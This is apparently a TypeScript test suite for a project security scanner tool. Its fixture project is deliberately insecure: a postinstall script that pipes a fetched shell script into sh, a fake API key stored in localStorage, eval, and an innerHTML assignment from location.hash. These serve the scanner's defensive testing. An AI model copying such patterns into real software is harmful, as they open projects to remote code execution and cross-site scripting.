import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import { callTool } from "../src/mcp/router.js";
import type { ToolContext } from "../src/mcp/types.js";
import { createProject, readProjectFile, writeProjectFile } from "../src/projects/store.js";
import { skillRegistry } from "../src/skills/registry.js";

function toolContext(root: string): ToolContext {
  return {
    publicBaseUrl: "https://example.test",
    workspaceRoot: root,
    commandTimeoutMs: 1000,
    shareRoot: path.join(root, "shares"),
    artifactRoot: path.join(root, "artifacts"),
    feedbackRoot: path.join(root, "feedback"),
    projectRoot: path.join(root, "projects"),
    clientId: "security-scan-test"
  };
}

test("scan_project_security reports dependency, CDN, secret, mixed-content, and browser API risks", async () => {
  const root = await mkdtemp(path.join(tmpdir(), "security-scan-"));
  try {
    const ctx = toolContext(root);
    const project = await createProject(ctx.projectRoot, { title: "Risky app", createdByClientId: "coder" });
    await writeProjectFile(ctx.projectRoot, project.id, "package.json", JSON.stringify({
      license: "GPL-3.0",
      dependencies: {
        lodash: "4.17.20",
        axios: "https://example.test/axios.tgz"
      },
      scripts: {
        postinstall: "curl https://example.test/install.sh | sh"
      }
    }, null, 2));
    await writeProjectFile(ctx.projectRoot, project.id, "index.html", `<!doctype html>
<html><body>
  <script src="http://cdn.example.test/legacy.js"></script>
  <script src="https://unpkg.com/react/umd/react.production.min.js"></script>
  <iframe src="https://example.test/embed"></iframe>
  <script src="app.js"></script>
</body></html>`);
    await writeProjectFile(ctx.projectRoot, project.id, "app.js", `const apiKey = "sk-abcdefghijklmnopqrstuvwxyz123456";
localStorage.setItem("token", apiKey);
document.body.innerHTML = location.hash;
eval("console.log('bad')");
navigator.geolocation.getCurrentPosition(() => {});
`);

    const result = await callTool("scan_project_security", { projectId: project.id }, ctx);
    assert.equal(result.ok, false, "critical secret finding should fail the scan");
    assert.deepEqual(result.artifacts.sort(), ["security/security-scan.json", "security/security-scan.md"].sort());

    const report = result.structuredContent as { findingCount: number; riskCounts: Record<string, number>; findings: Array<{ id: string; category: string; severity: string; path: string }> };
    assert.equal(report.findingCount >= 10, true);
    assert.equal(report.riskCounts.critical >= 1, true);
    assert.equal(report.riskCounts.high >= 3, true);
    const ids = new Set(report.findings.map((finding) => finding.id));
    for (const id of ["dependency-lodash", "dependency-non-registry-axios", "license-risk", "script-risk-postinstall", "mixed-content-http", "cdn-unpinned", "missing-sri", "iframe-no-sandbox", "secret-openai-key", "secret-generic-secret", "browser-api-eval", "browser-api-inner-html", "browser-api-local-storage-sensitive"]) {
      assert.ok(ids.has(id), `expected ${id}`);
    }

    const jsonReport = JSON.parse(await readProjectFile(ctx.projectRoot, project.id, "security/security-scan.json")) as { findings: unknown[] };
    assert.equal(jsonReport.findings.length, report.findingCount);
    const markdown = await readProjectFile(ctx.projectRoot, project.id, "security/security-scan.md");
    assert.match(markdown, /# Project Security Scan/);
    assert.match(markdown, /dependency/);
    assert.match(markdown, /Remove the secret/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("scan_project_security can omit low severity findings", async () => {
  const root = await mkdtemp(path.join(tmpdir(), "security-scan-"));
  try {
    const ctx = toolContext(root);
    const project = await createProject(ctx.projectRoot, { title: "Permission app", createdByClientId: "coder" });
    await writeProjectFile(ctx.projectRoot, project.id, "app.js", "navigator.geolocation.getCurrentPosition(() => {});\n");
    const result = await callTool("scan_project_security", { projectId: project.id, includeLowSeverity: false }, ctx);
    assert.equal(result.ok, true);
    const report = result.structuredContent as { findingCount: number; findings: Array<{ severity: string }> };
    assert.equal(report.findingCount, 0);
    assert.equal(report.findings.some((finding) => finding.severity === "low"), false);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("security scan tool is exposed through coding and debug skills", () => {
  for (const skillId of ["coding", "debug"]) {
    const skill = skillRegistry.find((entry) => entry.id === skillId);
    assert.ok(skill, `${skillId} skill exists`);
    assert.ok(skill!.toolNames.includes("scan_project_security"), `${skillId} exposes scan_project_security`);
  }
});
